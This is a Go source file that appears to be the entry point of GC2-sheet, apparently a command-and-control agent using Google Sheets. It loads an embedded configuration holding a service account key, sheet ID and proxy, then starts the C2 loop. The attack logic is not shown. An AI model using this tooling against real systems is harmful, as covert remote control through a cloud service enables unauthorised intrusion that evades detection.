package cmd

import (
	"GC2-sheet/internal/C2"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	_ "embed"
	"net/url"

	"gopkg.in/yaml.v2"
)

var (
	//go:embed options.yml
	configurationFileContent []byte
)

type ConfigurationFile struct {
	GoogleServiceAccountKey string `yaml:"GoogleServiceAccountKey"`
	GoogleSheetID           string `yaml:"GoogleSheetID"`
	RowId                   int    `yaml:"RowId"`
	Proxy                   string `yaml:"Proxy"`
	Verbose                 bool   `yaml:"Verbose"`
}

func Execute() {
	configurationFile := ConfigurationFile{
		RowId:   1,
		Proxy:   "",
		Verbose: false,
	}

	yaml.Unmarshal(configurationFileContent, &configurationFile)

	proxyUrl, err := url.Parse(configurationFile.Proxy)
	if err != nil {
		utils.LogFatalDebug("Proxy string invalid")
	}

	if configurationFile.Proxy == "" {
		proxyUrl = nil
	}

	configuration.SetOptions(
		configurationFile.GoogleServiceAccountKey,
		configurationFile.GoogleSheetID,
		configurationFile.RowId,
		proxyUrl,
		configurationFile.Verbose,
	)

	utils.LogDebug("Using configuration file")

	C2.Run()
}
